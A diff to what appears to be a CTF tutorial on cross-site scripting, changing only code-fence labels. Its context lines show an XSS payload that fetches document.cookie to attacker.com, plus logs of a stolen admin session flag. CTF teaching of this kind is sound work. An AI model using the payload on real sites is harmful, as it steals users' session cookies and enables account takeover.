@@ -70,7 +70,7 @@ Each reflection context requires a different payload structure. Knowing the cont
 
     Your exfiltration server receives:
 
-    ```
+    ```http
     GET /steal?c=session=CTF{st0r3d_xss_c00k13_th3ft_ftw} HTTP/1.1
     Host: attacker.com
     ```
@@ -92,7 +92,7 @@ Each reflection context requires a different payload structure. Knowing the cont
 
     Craft a URL that exploits this sink:
 
-    ```
+    ```http
     http://target.ctf/search?q=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>
     ```
 
@@ -173,7 +173,7 @@ Each reflection context requires a different payload structure. Knowing the cont
   <Step title="Wait for the Admin Bot and Capture the Flag">
     Submit the post, then monitor your exfiltration server. Most CTF bot challenges run the admin visit on a 30–60 second cycle. When the bot visits your post, your server logs the request:
 
-    ```
+    ```http
     GET /steal?c=session=CTF{st0r3d_xss_c00k13_th3ft_ftw} HTTP/1.1
     Host: attacker.com
     User-Agent: HeadlessChrome/...
@@ -193,7 +193,7 @@ curl -I http://target.ctf | grep -i content-security-policy
 
 A common CTF CSP looks like:
 
-```
+```http
 Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net; object-src 'none'
 ```
 
